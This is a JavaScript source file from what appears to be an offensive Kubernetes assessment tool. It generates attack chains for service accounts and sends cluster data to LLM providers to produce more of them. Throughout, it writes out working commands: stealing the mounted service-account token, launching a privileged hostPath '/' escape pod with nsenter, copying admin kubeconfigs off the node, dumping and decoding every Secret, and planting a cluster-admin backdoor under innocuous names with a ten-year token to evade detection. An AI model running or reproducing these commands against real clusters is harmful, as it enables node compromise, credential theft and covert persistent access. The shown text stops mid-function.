// analyzer.js
// Attack Chain Analyzer (God Mode) + AI-powered chain generation

/* ================================================================
   ATTACK CHAIN ANALYZER
   ================================================================ */
const CTF_CHAIN_TEMPLATE = [
  {
    phase: 'Initial Access',
    action: 'Steal ServiceAccount token from compromised pod',
    desc: 'From a foothold in a pod (via code execution, container escape, or supply chain), extract the mounted SA token.',
    cmd: `# Read the mounted service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Test API connectivity
curl -sk --cacert $CACERT \\
  -H "Authorization: Bearer $TOKEN" \\
  https://kubernetes.default.svc/api/v1/namespaces/$NS/pods`,
  },
  {
    phase: 'Reconnaissance',
    action: 'Enumerate permissions via SelfSubjectRulesReview',
    desc: 'Use SSRR to list all permissions granted to the current identity — a built-in Kubernetes API no special perms required.',
    cmd: `kubectl auth can-i --list
# Or via raw API:
curl -sk --cacert $CACERT \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \\
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews | jq '.status.resourceRules'`,
  },
  {
    phase: 'Privilege Escalation',
    action: 'Create privileged escape pod with hostPath "/" mount',
    desc: 'If pods/create is allowed, spawn a privileged pod mounting the host root filesystem to break out to the node.',
    cmd: `kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: k8s-escape
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: ubuntu:latest
    command: ["nsenter","-t","1","-m","-u","-i","-n","--","/bin/bash","-c","sleep 9999"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never
EOF`,
  },
  {
    phase: 'Node Compromise',
    action: 'Access kubelet credentials and node filesystem',
    desc: 'From inside the privileged pod, navigate host filesystem to extract kubelet kubeconfig and cluster PKI.',
    cmd: `kubectl exec -it k8s-escape -- /bin/sh

# Inside container — accessing host via /host
cat /host/etc/kubernetes/pki/ca.crt
cat /host/var/lib/kubelet/kubeconfig
cat /host/etc/kubernetes/admin.conf  # if control-plane node

# Read all SA tokens on the node
find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | while read f; do
  echo "=== $f ==="; cat "$f"; echo
done`,
  },
  {
    phase: 'Lateral Movement',
    action: 'Use extracted kubeconfig to access cluster as node identity',
    desc: 'Use the kubelet or admin kubeconfig found on the node to authenticate to the API server with elevated privileges.',
    cmd: `# Copy kubeconfig back to attacker machine
kubectl cp k8s-escape:/host/etc/kubernetes/admin.conf ./admin.conf

# Use the stolen kubeconfig
kubectl --kubeconfig=./admin.conf get secrets --all-namespaces
kubectl --kubeconfig=./admin.conf get nodes`,
  },
  {
    phase: 'Secret Exfiltration',
    action: 'Dump all Secrets across namespaces',
    desc: 'With cluster-admin access, extract and decode all Kubernetes Secrets including service tokens, database passwords, and API keys.',
    cmd: `# Dump all secrets as base64-decoded JSON
kubectl --kubeconfig=./admin.conf get secrets \\
  --all-namespaces -o json | \\
  jq -r '.items[] | {
    name: .metadata.name,
    namespace: .metadata.namespace,
    data: (.data // {} | with_entries(.value |= @base64d))
  }'`,
  },
  {
    phase: 'Persistence',
    action: 'Create hidden ClusterRoleBinding for persistent access',
    desc: 'Maintain access by binding a new or existing service account to cluster-admin. Use a non-obvious name to evade detection.',
    cmd: `# Create a backdoor SA
kubectl --kubeconfig=./admin.conf create sa svc-monitor -n kube-system

# Bind it to cluster-admin (uses innocuous name)
kubectl --kubeconfig=./admin.conf create clusterrolebinding \\
  monitoring-system-binding \\
  --clusterrole=cluster-admin \\
  --serviceaccount=kube-system:svc-monitor

# Generate a long-lived token
kubectl --kubeconfig=./admin.conf create token svc-monitor \\
  -n kube-system --duration=876000h`,
  },
];

/* ----------------------------------------------------------------
   ATTACK CHAIN ANALYZER — multi-SA chain builder
   ---------------------------------------------------------------- */
const PHASE_COLORS = {
  'Initial Access':       '#4cc9f0',
  'Reconnaissance':       '#74b9ff',
  'Privilege Escalation': '#ff9f43',
  'Lateral Movement':     '#a29bfe',
  'Node Compromise':      '#ff4757',
  'Secret Exfiltration':  '#ffd166',
  'Execution':            '#fd79a8',
  'Impact':               '#ff4757',
  'Persistence':          '#d63031',
};

function buildChainSteps(path) {
  const src   = nodeById[path.nodes[0]];
  const srcNs = src?.namespace || 'default';
  const steps = [];

  steps.push({
    phase: 'Initial Access',
    action: `Compromise ${src?.kind||'identity'}: ${src?.name||'?'}`,
    desc: `Gain code execution in a pod running as ${src?.name||'this identity'} — via RCE vulnerability, misconfigured workload, supply chain attack, or stolen credentials.`,
    cmd: `# Find pods running as this ServiceAccount
kubectl get pods -n ${srcNs} -o json | \\
  jq -r '.items[] | select(.spec.serviceAccountName=="${src?.name||'default'}") | .metadata.name'

# Exec into a running pod to get a shell
kubectl exec -it <pod-name> -n ${srcNs} -- /bin/sh

# Read the mounted SA token from inside the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)`,
  });

  steps.push({
    phase: 'Reconnaissance',
    action: 'Enumerate permissions via SelfSubjectRulesReview',
    desc: 'Enumerate all effective permissions without any special RBAC — SSRR is available to every authenticated user.',
    cmd: `# Quick permission check
kubectl auth can-i --list -n ${srcNs}
kubectl auth can-i --list --all-namespaces 2>/dev/null || true

# Check specific dangerous permissions
for perm in "create pods" "patch deployments" "get secrets" "list secrets" "create clusterrolebindings" "impersonate users"; do
  kubectl auth can-i $perm && echo "[ALLOWED] $perm" || echo "[denied] $perm"
done

# Full SSRR via raw API (works from inside a pod)
curl -sk --cacert $CACERT \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$NS"'"}}' \\
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews | \\
  jq '.status.resourceRules[] | select(.verbs[] | test("create|patch|get|list|delete|impersonate"))'`,
  });

  path.edges.forEach((ek, i) => {
    const sn = nodeById[path.nodes[i]];
    const tn = nodeById[path.nodes[i+1]];
    const cmdFn = ATTACK_CMD[ek];
    const info  = cmdFn ? cmdFn(sn||{}, tn||{}) : null;
    if (!info) return;

    let phase = 'Execution';
    if (['grants','bound_to','can_create','can_patch','can_impersonate'].includes(ek)) phase = 'Privilege Escalation';
    else if (['can_exec','runs_as','mounts','can_portforward'].includes(ek)) phase = 'Lateral Movement';
    else if (['can_get','can_list'].includes(ek) && tn?.kind === 'Secret') phase = 'Secret Exfiltration';
    if (tn?.kind === 'Node') phase = 'Node Breakout';
    if (i === path.edges.length - 1 && phase === 'Execution') phase = 'Impact';

    steps.push({
      phase,
      action: info.action,
      desc: `Edge: ${ek} — from ${sn?.kind||'?'} "${sn?.name||'?'}" → ${tn?.kind||'?'} "${tn?.name||'?'}"`,
      cmd: info.cmds.join('\n'),
    });
  });

  // Only add Persistence if the path achieves privilege escalation or cluster-level access
  const pathHasPrivEsc = path.edges.some(k =>
    ['can_create','can_patch','can_impersonate','grants','bound_to'].includes(k));
  const pathHasClusterAccess = path.nodes.some(nid => {
    const n = nodeById[nid];
    return n && (n.kind === 'ClusterRole' || n.kind === 'ClusterRoleBinding' || (n.risk_score||0) >= 8);
  });
  const pathHasSecretAccess = path.edges.some(k => ['can_get','can_list'].includes(k)) ||
    path.nodes.some(nid => nodeById[nid]?.kind === 'Secret');

  if (pathHasPrivEsc || pathHasClusterAccess) {
    steps.push({
      phase: 'Persistence',
      action: 'Install backdoor ClusterRoleBinding + generate long-lived token',
      desc: `With elevated access from ${src?.name||'this identity'}, create a hidden service account and bind it to cluster-admin for persistent control.`,
      cmd: `# Create backdoor SA under kube-system (blend in with system components)
kubectl create sa metrics-scraper -n kube-system

# Bind to cluster-admin with an innocent-sounding name
kubectl create clusterrolebinding monitoring-system-binding \\
  --clusterrole=cluster-admin \\
  --serviceaccount=kube-system:metrics-scraper

# Generate a long-lived token (10 years)
kubectl create token metrics-scraper -n kube-system --duration=87600h

# OR create a static token secret (persists across restarts)
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Secret
metadata:
  name: metrics-scraper-token
  namespace: kube-system
  annotations:
    kubernetes.io/service-account.name: metrics-scraper
type: kubernetes.io/service-account-token
EOF
kubectl get secret metrics-scraper-token -n kube-system -o jsonpath='{.data.token}' | base64 -d`,
    });
  }

  if (pathHasSecretAccess || pathHasClusterAccess) {
    steps.push({
      phase: 'Secret Exfiltration',
      action: 'Dump all Secrets across all namespaces',
      desc: `Exploiting access gained via ${src?.name||'this identity'}, extract every Secret including API keys, TLS certs, database passwords, and SA tokens.`,
      cmd: `# Dump all secrets with decoded values
kubectl get secrets --all-namespaces -o json | \\
  jq -r '.items[] | {
    ns: .metadata.namespace,
    name: .metadata.name,
    type: .type,
    data: (.data // {} | with_entries(.value |= (@base64d | gsub("\\n";""))))
  }' | tee /tmp/all-secrets.json

# Extract just service account tokens
kubectl get secrets --all-namespaces -o json | \\
  jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") |
    "\\(.metadata.namespace)/\\(.metadata.name): \\(.data.token // "" | @base64d | .[0:80])"'`,
    });
  }

  return steps;
}

/* Build SA-specific attack steps from actual graph edges (used when no DFS path reaches a target) */
function buildPermissionSteps(saId) {
  const sa = nodeById[saId];
  if (!sa) return [];
  const srcNs = sa.namespace || 'default';
  const steps = [];

  steps.push({
    phase: 'Initial Access',
    action: `Compromise ${sa.kind||'identity'}: ${sa.name||'?'}`,
    desc: `Gain code execution in a pod running as ${sa.name||'this identity'} — via RCE vulnerability, misconfigured workload, supply chain attack, or stolen credentials.`,
    cmd: `# Find pods running as this ServiceAccount
kubectl get pods -n ${srcNs} -o json | \\
  jq -r '.items[] | select(.spec.serviceAccountName=="${sa.name||'default'}") | .metadata.name'

# Exec into a running pod to get a shell
kubectl exec -it <pod-name> -n ${srcNs} -- /bin/sh

# Read the mounted SA token from inside the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)`,
  });

  steps.push({
    phase: 'Reconnaissance',
    action: `Enumerate all permissions of ${sa.name||'this identity'}`,
    desc: 'SSRR is available to every authenticated user — no special permissions needed to enumerate your own effective rules.',
    cmd: `# Quick permission listing
kubectl auth can-i --list -n ${srcNs}
kubectl auth can-i --list --all-namespaces 2>/dev/null || true

# Check specific dangerous permissions
for perm in "create pods" "patch deployments" "get secrets" "list secrets" "create clusterrolebindings" "impersonate users"; do
  kubectl auth can-i $perm -n ${srcNs} && echo "[ALLOWED] $perm" || echo "[denied] $perm"
done

# Full SSRR via raw API (works from inside a pod)
curl -sk --cacert $CACERT \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"${srcNs}"}}' \\
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews | \\
  jq '.status.resourceRules[] | select(.verbs[] | test("create|patch|get|list|delete|impersonate"))'`,
  });

  // Collect all direct attack edges from this SA in the graph
  const edgePriority = {
    can_create: 10, can_impersonate: 9, can_get: 8, can_list: 7,
    can_patch: 7, can_exec: 6, grants: 6, runs_as: 5, mounts: 5,
    bound_to: 4, can_portforward: 3, member_of: 3, can_delete: 3,
  };
  const directOps = [];
  if (graphData) {
    graphData.edges.forEach(e => {
      const sid = edgeNodeId(e.source || e.from);
      if (sid !== saId || !ATTACK_EDGE_KINDS.has(e.kind)) return;
      const tid = edgeNodeId(e.target || e.to);
      const tgt = nodeById[tid];
      if (!tgt) return;
      const cmdFn = ATTACK_CMD[e.kind];
      if (!cmdFn) return;
      const info = cmdFn(sa, tgt);
      directOps.push({ kind: e.kind, target: tgt, info, priority: edgePriority[e.kind] || 0 });
    });
  }
  directOps.sort((a, b) => b.priority - a.priority);

  if (!directOps.length) {
    steps.push({
      phase: 'Reconnaissance',
      action: 'No dangerous permissions detected for this identity',
      desc: 'This identity has no direct attack edges in the graph. It may have minimal RBAC or only namespace-scoped read access. Check for indirect paths via group memberships or RBAC bindings.',
      cmd: `# Verify manually
kubectl auth can-i --list -n ${srcNs}

# Check for indirect RBAC bindings to this SA
kubectl get rolebindings,clusterrolebindings -A -o json | \\
  jq -r '.items[] | select(.subjects[]? | select(.kind=="ServiceAccount" and .name=="${sa.name||'default'}")) | .metadata.name + ": " + .roleRef.name'`,
    });
    return steps;
  }

  // Build attack steps from top edges — deduplicate by target kind+name
  let hasPrivEsc = false, hasSecretAccess = false;
  const seen = new Set();
  directOps.forEach(op => {
    const key = `${op.kind}:${op.target.kind}:${op.target.name}`;
    if (seen.has(key) || steps.length >= 8) return;
    seen.add(key);

    let phase = 'Execution';
    if (['grants','bound_to','can_create','can_patch','can_impersonate'].includes(op.kind)) {
      phase = 'Privilege Escalation'; hasPrivEsc = true;
    } else if (['can_exec','runs_as','mounts','can_portforward'].includes(op.kind)) {
      phase = 'Lateral Movement';
    } else if (['can_get','can_list'].includes(op.kind) && op.target?.kind === 'Secret') {
      phase = 'Secret Exfiltration'; hasSecretAccess = true;
    }
    if (op.target?.kind === 'Node') phase = 'Node Breakout';

    steps.push({
      phase,
      action: op.info.action,
      desc: `${sa.name||'This SA'} has permission: ${op.kind} → ${op.target.kind} "${op.target.name}" (namespace: ${op.target.namespace||'cluster-wide'})`,
      cmd: op.info.cmds.join('\n'),
    });
  });

  if (hasPrivEsc) {
    steps.push({
      phase: 'Persistence',
      action: 'Install backdoor ClusterRoleBinding + generate long-lived token',
      desc: `Leveraging elevated access from ${sa.name||'this identity'}, create a hidden SA bound to cluster-admin for persistent control.`,
      cmd: `kubectl create sa metrics-scraper -n kube-system

kubectl create clusterrolebinding monitoring-system-binding \\
  --clusterrole=cluster-admin \\
  --serviceaccount=kube-system:metrics-scraper

kubectl create token metrics-scraper -n kube-system --duration=87600h`,
    });
  }

  if (hasSecretAccess || hasPrivEsc) {
    steps.push({
      phase: 'Secret Exfiltration',
      action: 'Dump all Secrets accessible to this identity',
      desc: `Extract secrets reachable via ${sa.name||'this identity'}'s permissions — API keys, TLS certs, database passwords, SA tokens.`,
      cmd: `# Dump all secrets with decoded values
kubectl get secrets --all-namespaces -o json | \\
  jq -r '.items[] | {
    ns: .metadata.namespace,
    name: .metadata.name,
    type: .type,
    data: (.data // {} | with_entries(.value |= (@base64d | gsub("\\n";""))))
  }' | tee /tmp/all-secrets.json

# Extract service account tokens
kubectl get secrets --all-namespaces -o json | \\
  jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") |
    "\\(.metadata.namespace)/\\(.metadata.name): \\(.data.token // "" | @base64d | .[0:80])"'`,
    });
  }

  return steps;
}

/* Build chains for GOD mode: either all-SA top paths or per-SA paths */
function buildGodChains(saId) {
  if (!graphData) return [];

  let pathsToUse = [];

  if (saId === '__all__') {
    // Best path per unique source SA/identity (top 8 by impact)
    const bySource = {};
    computedPaths.forEach(p => {
      const src = p.nodes[0];
      const score = pathImpactType(p).score;
      if (!bySource[src] || score > pathImpactType(bySource[src]).score) {
        bySource[src] = p;
      }
    });
    pathsToUse = Object.values(bySource)
      .sort((a, b) => pathImpactType(b).score - pathImpactType(a).score)
      .slice(0, 8);

    // If no paths, build permission-based chain for the highest-risk SA
    if (!pathsToUse.length) {
      const sa = graphData.nodes
        .filter(n => n.kind === 'ServiceAccount' || n.kind === 'Identity')
        .sort((a, b) => (b.risk_score||0) - (a.risk_score||0))[0];
      return sa ? [{sourceNode: sa, path: null, steps: buildPermissionSteps(sa.id)}] : [];
    }
  } else {
    // All paths from this SA (up to 6)
    pathsToUse = computedPaths
      .filter(p => p.nodes[0] === saId)
      .sort((a, b) => pathImpactType(b).score - pathImpactType(a).score)
      .slice(0, 6);

    // If no computed paths, build a chain from this SA's actual graph edges
    if (!pathsToUse.length) {
      const sa = nodeById[saId];
      return sa ? [{sourceNode: sa, path: null, steps: buildPermissionSteps(saId)}] : [];
    }
  }

  return pathsToUse.map(path => ({
    sourceNode: nodeById[path.nodes[0]],
    path,
    steps: buildChainSteps(path),
  }));
}

function populateGodSASelector() {
  if (!graphData) return;
  const sel = document.getElementById('god-sa-select');
  const previousValue = sel.value;
  sel.innerHTML = '<option value="__all__">All Identities</option>';

  // Get all source nodes (Identity + SA) sorted by their max path impact
  const sourcePaths = {};
  computedPaths.forEach(p => {
    const src = p.nodes[0];
    const score = pathImpactType(p).score;
    if (!sourcePaths[src] || score > sourcePaths[src]) sourcePaths[src] = score;
  });

  // Include all SA/Identity nodes, sorted by:
  // 1. SA has running workload (foothold-backed first)
  // 2. Max attack path score
  // 3. Raw risk_score
  graphData.nodes
    .filter(n => n.kind === 'ServiceAccount' || n.kind === 'Identity')
    .sort((a, b) => {
      const aHasWL = saWithWorkload.has(a.id) ? 1 : 0;
      const bHasWL = saWithWorkload.has(b.id) ? 1 : 0;
      if (aHasWL !== bHasWL) return bHasWL - aHasWL;
      const aScore = sourcePaths[a.id] || (a.risk_score || 0);
      const bScore = sourcePaths[b.id] || (b.risk_score || 0);
      return bScore - aScore;
    })
    .forEach(n => {
      const opt   = document.createElement('option');
      opt.value   = n.id;
      const score = sourcePaths[n.id];
      const label = `${n.namespace ? n.namespace+'/' : ''}${n.name||n.id}`;
      const foothold = saWithWorkload.has(n.id) ? ' ⬢' : '';
      opt.textContent = score ? `${label}${foothold}  [score ${score}]` : `${label}${foothold}`;
      sel.appendChild(opt);
    });

  if (previousValue && [...sel.options].some(opt => opt.value === previousValue)) {
    sel.value = previousValue;
  }
}

function renderGodPanel() {
  const body  = document.getElementById('god-body');
  const saId  = document.getElementById('god-sa-select').value;
  body.innerHTML = '';
  document.getElementById('god-chains-count').textContent = '';

  if (!graphData) {
    body.innerHTML = '<div class="god-empty">Load a k8scout JSON file to begin.</div>';
    return;
  }

  const subtitle = document.getElementById('god-subtitle');
  if (saId === '__all__') {
    subtitle.textContent = 'Select an identity, then click ⚡ Generate';
  } else {
    const n = nodeById[saId];
    subtitle.textContent = n ? `${n.namespace ? n.namespace+'/' : ''}${n.name||saId}` : saId;
  }

  const aiOn = document.getElementById('god-ai-toggle').classList.contains('active');
  if (!aiOn) {
    body.innerHTML = '<div class="god-empty">Enable 🤖 AI Mode and enter an API key,<br>then select an identity and click ⚡ Generate.</div>';
    return;
  }

  if (saId === '__all__') {
    body.innerHTML = '<div class="god-empty">Select a specific identity from the dropdown<br>to generate an AI-powered attack chain.</div>';
    return;
  }

  body.innerHTML = '<div class="god-empty" style="color:var(--accent2);opacity:.8">Ready — click ⚡ Generate to analyze this identity.</div>';
}

function syncIdentityAnalyzerTrigger(active) {
  document.getElementById('god-btn')?.classList.toggle('active', !!active);
}

function closeIdentityAnalyzer() {
  const panel = document.getElementById('god-panel');
  panel?.classList.remove('visible');
  syncIdentityAnalyzerTrigger(false);
}

function parkIdentityAnalyzer() {
  const panel = document.getElementById('god-panel');
  const host = document.getElementById('shared-panel-host');
  if (!panel || !host) return;
  if (panel.parentElement !== host) host.appendChild(panel);
  panel.classList.remove('embedded');
  closeIdentityAnalyzer();
}

function mountIdentityAnalyzer(containerEl) {
  const panel = document.getElementById('god-panel');
  if (!panel || !containerEl) return;
  if (panel.parentElement !== containerEl) containerEl.appendChild(panel);
  panel.classList.add('embedded');
  const needsRefresh = panel.dataset.boundVersion !== String(dataVersion);
  const provider = getActiveProvider();
  const saved = localStorage.getItem(PROVIDER_KEY_STORAGE[provider] || PROVIDER_KEY_STORAGE.openai);
  if (saved) document.getElementById('god-ai-key').value = saved;
  populateGodSASelector();
  if (needsRefresh || !panel.querySelector('.god-ai-block')) renderGodPanel();
  panel.dataset.boundVersion = String(dataVersion);
}

window.closeIdentityAnalyzer = closeIdentityAnalyzer;

document.getElementById('god-btn')?.addEventListener('click', () => {
  const panel = document.getElementById('god-panel');
  if (!panel) return;
  const isVisible = panel.classList.contains('visible');
  if (!isVisible) {
    const provider = getActiveProvider();
    const saved = localStorage.getItem(PROVIDER_KEY_STORAGE[provider] || PROVIDER_KEY_STORAGE.openai);
    if (saved) document.getElementById('god-ai-key').value = saved;
    populateGodSASelector();
    renderGodPanel();
    panel.classList.add('visible');
    syncIdentityAnalyzerTrigger(true);
  } else {
    closeIdentityAnalyzer();
  }
});

document.getElementById('god-close')?.addEventListener('click', closeIdentityAnalyzer);

document.getElementById('god-sa-select')?.addEventListener('change', () => {
  const saId = document.getElementById('god-sa-select').value;
  const aiOn = document.getElementById('god-ai-toggle').classList.contains('active');
  document.getElementById('god-ai-generate').disabled = !aiOn || saId === '__all__';
  // Clear any previous AI result and show fresh ready state
  renderGodPanel();
  if (saId !== '__all__' && aiOn) {
    document.getElementById('god-ai-status').textContent = 'Ready';
  } else if (saId === '__all__' && aiOn) {
    document.getElementById('god-ai-status').textContent = 'Select a specific SA';
  }
});

/* ================================================================
   ATTACK CHAIN ANALYZER — AI-POWERED CHAIN GENERATION
   ================================================================ */

const PROVIDER_MODELS = {
  openai: [
    { value: 'gpt-4o',           label: 'GPT-4o' },
    { value: 'gpt-4-turbo',      label: 'GPT-4 Turbo' },
    { value: 'gpt-3.5-turbo',    label: 'GPT-3.5 Turbo' },
  ],
  openrouter: [
    { value: 'anthropic/claude-opus-4-5',          label: 'Claude Opus 4.5' },
    { value: 'anthropic/claude-sonnet-4-5',        label: 'Claude Sonnet 4.5' },
    { value: 'anthropic/claude-3-7-sonnet',        label: 'Claude 3.7 Sonnet' },
    { value: 'google/gemini-2.5-pro',              label: 'Gemini 2.5 Pro' },
    { value: 'google/gemini-flash-1.5',            label: 'Gemini Flash 1.5' },
    { value: 'openai/gpt-4o',                      label: 'GPT-4o (via OR)' },
    { value: 'openai/o3-mini',                     label: 'o3-mini (via OR)' },
    { value: 'deepseek/deepseek-r1',               label: 'DeepSeek R1' },
    { value: 'meta-llama/llama-3.3-70b-instruct',  label: 'Llama 3.3 70B' },
    { value: 'mistralai/mistral-large',            label: 'Mistral Large' },
  ],
};

const PROVIDER_ENDPOINTS = {
  openai:      'https://api.openai.com/v1/chat/completions',
  openrouter:  'https://openrouter.ai/api/v1/chat/completions',
};

const PROVIDER_KEY_STORAGE = {
  openai:     'k8scout-openai-key',
  openrouter: 'k8scout-openrouter-key',
};

function getActiveProvider() {
  return document.getElementById('god-ai-provider')?.value || 'openai';
}

function updateModelDropdown(provider) {
  const sel = document.getElementById('god-ai-model');
  if (!sel) return;
  sel.innerHTML = '';
  (PROVIDER_MODELS[provider] || PROVIDER_MODELS.openai).forEach(m => {
    const opt = document.createElement('option');
    opt.value = m.value;
    opt.textContent = m.label;
    sel.appendChild(opt);
  });
}

function updateKeyPlaceholder(provider) {
  const input = document.getElementById('god-ai-key');
  if (!input) return;
  input.placeholder = provider === 'openrouter' ? 'sk-or-v1-…  OpenRouter key' : 'sk-…  OpenAI key';
  // Restore saved key for this provider
  const saved = localStorage.getItem(PROVIDER_KEY_STORAGE[provider] || PROVIDER_KEY_STORAGE.openai);
  if (saved) input.value = saved;
  else input.value = '';
}

document.getElementById('god-ai-provider').addEventListener('change', function() {
  const provider = this.value;
  updateModelDropdown(provider);
  updateKeyPlaceholder(provider);
});

function buildAIFetchOptions(apiKey, model, messages) {
  const provider = getActiveProvider();
  const endpoint = PROVIDER_ENDPOINTS[provider];
  const headers = {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${apiKey}`,
  };
  if (provider === 'openrouter') {
    headers['HTTP-Referer'] = 'https://github.com/k8scout/k8scout';
    headers['X-Title'] = 'k8scout';
  }
  // response_format json_object is only reliable on OpenAI and some OR models;
  // include it anyway — models that don't support it ignore it gracefully.
  const body = { model, messages, temperature: 0.15, max_tokens: 6000, response_format: { type: 'json_object' } };
  return { endpoint, headers, body };
}

function buildAIPromptData(saId) {
  const sa = nodeById[saId];
  if (!sa) return null;
  const { nodes, edges, findings } = graphData;

  const saEdges = edges.filter(e => edgeNodeId(e.source || e.from) === saId);

  // ── RBAC rule index from raw cluster data ─────────────────────────────────
  // Graph Node structs don't embed policy rules; look them up from raw JSON.
  const ruleIndex = {};
  (rawGraphData?.cluster_objects?.cluster_roles || []).forEach(cr => {
    ruleIndex['clusterrole:' + cr.name] = cr.rules || [];
  });
  (rawGraphData?.cluster_objects?.roles || []).forEach(r => {
    ruleIndex['role:' + (r.namespace || '') + ':' + r.name] = r.rules || [];
  });

  // ── Helper: resolve actual RBAC rules for any SA/identity node ───────────
  // Uses raw binding data directly — avoids the "role::NAME" namespace bug in
  // graph edges (builder.go emits "role::" + name without namespace for Roles).
  function getSARules(targetSAId) {
    const saNode = nodeById[targetSAId];
    if (!saNode) return [];
    const saName = saNode.name;
    const saNs   = saNode.namespace || '';

    // 1. Reviewer mode: all_identity_perms has pre-computed effective rules — best source.
    const ip = (rawGraphData?.all_identity_perms || []).find(p =>
      p.name === saName && (p.namespace || '') === saNs
    );
    if (ip?.rules?.length) {
      return ip.rules.slice(0, 12).map(r =>
        `[${(ip.bound_roles||[]).slice(0,2).join('+')||saName}] ` +
        `verbs=[${(r.verbs||[]).join(',')}] resources=[${(r.resources||[]).join(',')}]` +
        (r.resource_names?.length ? ` resourceNames=[${r.resource_names.join(',')}]` : '')
      );
    }

    // 2. Standard mode: scan raw bindings in cluster_objects (namespace-aware).
    const lines = [];
    const isSA   = s => s.kind === 'ServiceAccount' && s.name === saName && (s.namespace || '') === saNs;
    const isUser = s => s.kind === 'User' && saNode.kind === 'Identity' && s.name === saName;
    const isSubj = s => isSA(s) || isUser(s);

    (rawGraphData?.cluster_objects?.cluster_role_bindings || []).forEach(crb => {
      if (!(crb.subjects || []).some(isSubj)) return;
      const key = 'clusterrole:' + crb.role_ref?.name;
      (ruleIndex[key] || []).slice(0, 6).forEach(r =>
        lines.push(
          `[${crb.role_ref?.name}] verbs=[${(r.verbs||[]).join(',')}] resources=[${(r.resources||[]).join(',')}]` +
          (r.resource_names?.length ? ` resourceNames=[${r.resource_names.join(',')}]` : '')
        )
      );
    });

    (rawGraphData?.cluster_objects?.role_bindings || []).forEach(rb => {
      if (!(rb.subjects || []).some(isSubj)) return;
      const rbNs = rb.namespace || saNs;
      const key  = rb.role_ref?.kind === 'ClusterRole'
        ? 'clusterrole:' + rb.role_ref.name
        : 'role:' + rbNs + ':' + rb.role_ref?.name;
      (ruleIndex[key] || []).slice(0, 6).forEach(r =>
        lines.push(
          `[${rb.role_ref?.name} in ${rbNs}] verbs=[${(r.verbs||[]).join(',')}] resources=[${(r.resources||[]).join(',')}]` +
          (r.resource_names?.length ? ` resourceNames=[${r.resource_names.join(',')}]` : '')
        )
      );
    });

    // 3. For the current identity in standard mode, SSRR data is the most authoritative.
    if (lines.length === 0) {
      const ssrrByNs = rawGraphData?.permissions?.ssrr_by_namespace || {};
      Object.entries(ssrrByNs).slice(0, 6).forEach(([ns, rules]) => {
        (rules || []).slice(0, 5).forEach(r => {
          if (r.resources?.length && r.verbs?.length)
            lines.push(`[ssrr:${ns||'cluster'}] verbs=[${(r.verbs||[]).join(',')}] resources=[${(r.resources||[]).join(',')}]`);
        });
      });
    }

    return lines.slice(0, 12);
  }

  function getSACaps(targetSAId) {
    return edges
      .filter(e => edgeNodeId(e.source || e.from) === targetSAId && e.kind.startsWith('can_'))
      .map(e => {
        const tgt = nodeById[edgeNodeId(e.target || e.to)];
        return `${e.kind} → "${tgt?.name||'?'}" (ns: ${tgt?.namespace||'cluster'})`;
      }).slice(0, 8);
  }

  // ── This SA's bound RBAC rules ────────────────────────────────────────────
  const ownRoleLines = getSARules(saId);

  // ── Direct capability edges ────────────────────────────────────────────────
  const directCaps = saEdges
    .filter(e => e.kind.startsWith('can_'))
    .map(e => {
      const tgt = nodeById[edgeNodeId(e.target || e.to)];
      const flags = [
        e.inferred ? '[inferred]' : '',
        tgt?.metadata?.has_captured_values === 'true' ? '[VALUES_CAPTURED]' : '',
        tgt?.metadata?.has_captured_data === 'true' ? '[DATA_CAPTURED]' : '',
      ].filter(Boolean).join(' ');
      return `  ${e.kind} ${flags} → ${tgt?.kind||'?'} "${tgt?.name||'?'}" (ns: ${tgt?.namespace||'cluster'})`;
    });

  // ── Workloads running as this SA ──────────────────────────────────────────
  const ownWorkloadIdSet = new Set(
    edges.filter(e => e.kind === 'runs_as' && edgeNodeId(e.target || e.to) === saId)
         .map(e => edgeNodeId(e.source || e.from))
  );
  const ownWorkloadLines = [...ownWorkloadIdSet].map(wlId => {
    const wl = nodeById[wlId];
    return `  ${wl?.kind||'?'}/${wl?.name||'?'} (ns: ${wl?.namespace||'?'})`;
  });

  // ── Namespaces where SA has confirmed get/list access to secrets / CMs ────
  // Only include secrets/CMs actually accessible by this specific SA.
  // Prevent hallucination: do NOT show cluster-wide secret list.
  const secretGetNs = new Set();
  const cmGetNs = new Set();
  saEdges.forEach(e => {
    if (e.kind !== 'can_get' && e.kind !== 'can_list') return;
    const tgt = nodeById[edgeNodeId(e.target || e.to)];
    if (!tgt) return;
    const nm = (tgt.name || '').toLowerCase();
    if (nm === 'secrets' || nm.startsWith('secrets/') || tgt.kind === 'Secret')
      secretGetNs.add(tgt.namespace || '');
    if (nm === 'configmaps' || tgt.kind === 'ConfigMap')
